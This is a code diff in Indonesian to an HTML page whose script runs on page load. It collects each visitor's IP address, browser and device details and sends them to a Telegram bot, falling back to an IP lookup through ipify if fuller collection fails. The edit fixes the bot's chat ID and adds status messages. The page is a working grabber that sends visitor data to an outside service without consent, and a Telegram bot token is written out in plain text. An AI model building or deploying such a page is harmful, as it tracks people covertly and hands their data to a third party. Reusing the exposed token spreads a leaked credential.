@@ -4,11 +4,13 @@
     <title>Informasi Perangkat (Otomatis)</title>
 </head>
 <body>
-    <h1>Mengumpulkan Informasi...</h1>
+    <h1 id="status">Mengumpulkan Informasi...</h1>
     <script>
+        const statusElement = document.getElementById('status');
+
         function sendDataToTelegram(data) {
             const botToken = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k'; // Ganti dengan token bot Anda
-            const chatId = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';     // Ganti dengan chat ID Anda
+            const chatId = '7218964278';     // Ganti dengan chat ID Anda
             let message = "📊 **Informasi Pengunjung** 📊\n\n";
             message += `🌐 **IP Address:** ${data["IP Address"]}\n`;
             message += `💻 **Browser:** ${data["Browser"]}\n`;
@@ -25,8 +27,14 @@
 
             fetch(apiUrl)
                 .then(response => response.json())
-                .then(responseData => console.log('Pesan terkirim:', responseData))
-                .catch(error => console.error('Gagal mengirim pesan:', error));
+                .then(responseData => {
+                    console.log('Pesan terkirim:', responseData);
+                    statusElement.textContent = 'Informasi terkirim.'; // Ubah status jika berhasil
+                })
+                .catch(error => {
+                    console.error('Gagal mengirim pesan:', error);
+                    statusElement.textContent = 'Gagal mengirim informasi.'; // Ubah status jika gagal
+                });
         }
 
         function getDeviceInfoAndSend() {
@@ -66,7 +74,8 @@
                 })
                 .catch(error => {
                     console.error('Gagal mendapatkan informasi:', error);
-                    // Jika gagal mendapatkan informasi, kirim hanya IP
+                    statusElement.textContent = 'Gagal mendapatkan informasi.'; // Ubah status jika gagal dapat info
+                    // Jika gagal mendapatkan informasi lengkap, coba kirim hanya IP
                     fetch('https://api.ipify.org?format=json')
                         .then(response => response.json())
                         .then(data => {
